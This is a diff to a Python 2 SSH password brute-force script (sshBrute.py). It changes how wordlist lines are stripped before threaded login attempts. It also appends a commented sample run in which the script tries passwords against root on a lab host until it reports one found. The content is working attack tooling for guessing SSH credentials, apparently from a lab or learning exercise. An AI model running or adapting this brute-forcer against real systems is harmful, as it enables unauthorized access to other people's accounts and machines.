@@ -51,10 +51,22 @@ def main():
             print "[!] Exiting: Too Many Socket Timeouts"
             exit(0)
         connection_lock.acquire()
-        password = line.strip('\r').split('\n')  # Here may needs to change to avoid ['','']
+        password = line.strip('\r')  # Here may need to add .split('\n') on Windows OS
         print "[-] Testing: " + str(password)
         t = Thread(target=connect, args=(host, user, password, True))
         child = t.start()
 
 if __name__ == '__main__':
     main()
+    
+#[root@NickCOS72V1 python]# python sshBrute.py -H NickCOS72V1.hpeswlab.net -u root -F pass.txt
+#[-] Testing: 12345
+#
+#[-] Testing: root
+#
+#[-] Testing: 1Qaz2wsx
+#
+#[-] Testing: mypass
+#
+#[+] Password Found: mypass
+#
